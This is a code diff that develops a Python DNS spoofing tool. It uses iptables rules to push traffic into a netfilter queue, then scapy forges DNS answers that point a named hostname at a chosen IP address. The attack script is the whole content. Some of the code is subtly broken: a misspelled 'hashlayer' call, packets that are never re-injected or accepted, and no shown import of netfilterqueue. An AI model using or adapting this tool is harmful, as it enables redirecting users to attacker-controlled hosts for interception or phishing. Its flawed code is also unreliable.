@@ -3,10 +3,9 @@ import scapy.all as scapy
 import subprocess
 
 
-from_hostname: str
+if_hostname: str
 to_ip: str
-commands: list
-VMenv: bool
+VMenv: str
 
 
 def process_packet(packet):
@@ -18,21 +17,37 @@ def process_packet(packet):
     if scapy_packet.hashlayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
 
-        if from_hostname in qname:
+        if if_hostname in qname:
             print("[+] Spoofing start")
             answer = scapy.DNSRR(rrname=qname, rdata=to_ip)
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
 
 
 def env_set(VMenv):
 
     if VMenv == "VM":
-        subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
-        subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
+        subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+        subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
     elif VMenv == "OS":
-        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
+        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
     else:
         print("[!] Wrong enviroment settings")
 
 
 if __name__ == "__main__":
-    pass
+
+    if_hostname = "geekboards.ru"
+    to_ip = "140.82.121.3"
+    VMenv = "VM"
+
+    env_set(VMenv)
+
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
